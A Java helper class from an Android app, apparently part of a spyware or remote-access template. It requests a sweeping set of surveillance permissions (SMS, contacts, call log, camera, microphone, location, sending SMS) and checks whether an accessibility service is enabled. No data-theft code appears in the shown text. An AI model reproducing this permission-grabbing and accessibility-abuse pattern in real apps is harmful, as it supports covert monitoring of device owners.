package com.test.myapp;



import static android.service.controls.ControlsProviderService.TAG;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;


public class OptionAccessibilityClass {

    public static int speedTime = 1000;

    public static boolean NeedSuper() {
        String S = "USE-SUPER";
        //String S = "on";
        if (S == "on") {
            return true;
        } else {
            return false;
        }
    }

    public static int Trys = 6;

    public static MyAccessibilityService MyAccess = null;
    public static boolean IsAskPermission = false;

    public static String[] PERMISSIONS () {

        String[] pre = {
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.GET_ACCOUNTS,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.CHANGE_WIFI_STATE,
                android.Manifest.permission.ACCESS_WIFI_STATE,
                android.Manifest.permission.ACCESS_NETWORK_STATE,
                android.Manifest.permission.WAKE_LOCK,
                android.Manifest.permission.INTERNET,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.SEND_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION};

        return  pre;
    }


    public static boolean checkPermission(Context context, String...permissions) {
        if (context != null && permissions != null) {
            for (String permission: permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }


    public static boolean checkAccessibilityEnable(Context context, Class<?> accessibilityService) {
        try {
            ComponentName expectedComponentName = new ComponentName(context, accessibilityService);

            String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServicesSetting == null)
                return false;

            TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
            colonSplitter.setString(enabledServicesSetting);

            while (colonSplitter.hasNext()) {
                String componentNameString = colonSplitter.next();
                ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);

                if (enabledService != null && enabledService.equals(expectedComponentName))
                    return true;
            }
        } catch (Exception ex) {
            // SettingsToAdd(context, consts.LogSMS , consts.string_189 + ex.toString() + consts.string_119);
        }
        return false;
    }

    public static boolean checkPermissionGranted(Context context, String...permissions) {
        if (context != null && permissions != null) {
            for (String permission: permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

}
